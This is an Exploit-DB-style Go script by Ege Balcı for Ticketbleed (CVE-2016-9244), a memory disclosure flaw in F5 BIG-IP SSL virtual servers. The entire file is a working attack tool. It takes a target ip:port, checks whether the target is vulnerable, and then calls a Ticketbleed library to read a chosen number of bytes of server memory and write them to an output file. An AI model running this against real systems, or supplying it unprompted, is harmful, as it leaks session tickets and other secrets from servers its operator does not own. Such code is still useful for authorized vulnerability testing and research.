/*

# Exploit Title: [Ticketbleed - F5 BIG-IP SSL virtual server  Memory Disclosure]
# Date: [09.02.2017]
# Exploit Author: [Ege Balcı]
# Vendor Homepage: [https://support.f5.com]
# Software Link: [N/A]
# Version: [N/A]
# Tested on: [N/A]
# CVE : [CVE-2016-9244]

*/
package main

import "github.com/EgeBalci/Ticketbleed"
import "strconv"
import "strings"
import "fmt"
import "os"


var Help string = `
USAGE: 
	./ticketbleed <options> <ip:port>
OPTIONS:
	-o, --out 	Output filename for raw memory
	-s, --size 	Size in bytes to read
	-h, --help 	Print this message
`

var OutputFile string = ""
var BleedSize int = 0

func main() {


	ARGS := os.Args[1:]
	if len(ARGS) < 1 || len(ARGS) > 5{
		fmt.Println(Help)
		os.Exit(1)
	}

  	for i := 0; i < len(ARGS); i++{

		if ARGS[i] == "-h" || ARGS[i] == "--help"{
			fmt.Println(Help)
			os.Exit(1)
	  	}

		if ARGS[i] == "-o" || ARGS[i] == "--out"{
			OutputFile = ARGS[i+1]
	  	}

	  	if ARGS[i] == "-s" || ARGS[i] == "--size"{
	  		Size,err := strconv.Atoi(ARGS[i+1])
	  		if err != nil {
	  			fmt.Println("[-] ERROR: Invalid size value !")
	  			os.Exit(1)
	  		}
	  		if Size < 0 {
	  			fmt.Println("[-] ERROR: Size can't be smaller than 0")
	  			os.Exit(1)
	  		}else{
	  			BleedSize = Size
	  		}
	  	}
 	}

	if OutputFile != "" {
		File, FileErr := os.Create(OutputFile)
		if FileErr != nil {
			fmt.Println("[-] ERROR: While creating output file !")
			os.Exit(1)
		}
		File.Close()
		fmt.Println("[*] Output file: "+OutputFile)
	}

 	VulnStatus := Ticketbleed.Check(ARGS[0])
 	fmt.Println(VulnStatus)
 	if strings.Contains(VulnStatus, "[+]") {
 		Ticketbleed.Exploit(ARGS[0], OutputFile, BleedSize)
 	}

}



